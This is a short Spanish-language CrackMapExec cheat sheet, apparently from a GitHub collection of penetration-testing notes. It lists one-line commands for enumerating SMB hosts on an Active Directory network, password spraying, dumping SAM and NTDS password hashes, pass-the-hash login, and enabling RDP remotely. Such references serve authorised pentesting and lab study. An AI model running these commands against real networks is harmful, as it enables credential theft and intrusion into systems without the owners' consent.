# CrackMapExec Cheat Sheet

#### Listar equipos dentro de la red de un AD
```
crackmapexec smb 192.168.1.0/24
```

#### Password Spraying
```
crackmapexec smb 192.168.1.0/24 -u '<username>' -p listpassword.txt
```

#### Conocer en que equipos se puede autenticar especificando un usuario y password
```
crackmapexec smb 192.168.1.0/24 -u '<username>' -p '<password>'
```

#### Dumping Hashes SAM
```
crackmapexec smb 192.168.1.23 -u '<username>' -p '<password>' --sam
```

#### Dumping Hashes NTLM
```
crackmapexec smb 192.168.1.22 -u '<username>' -p '<password>' --ntds
```

#### PassTheHash
```
crackmapexec smb 192.168.1.23 -u '<username>' -H '<hash>' --local-auth
```

#### Habilitar RDP con usuario y password de Administrador
```
crackmapexec smb 192.168.1.22 -u '<username>' -p '<password>' -M rdp -o action=enable
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)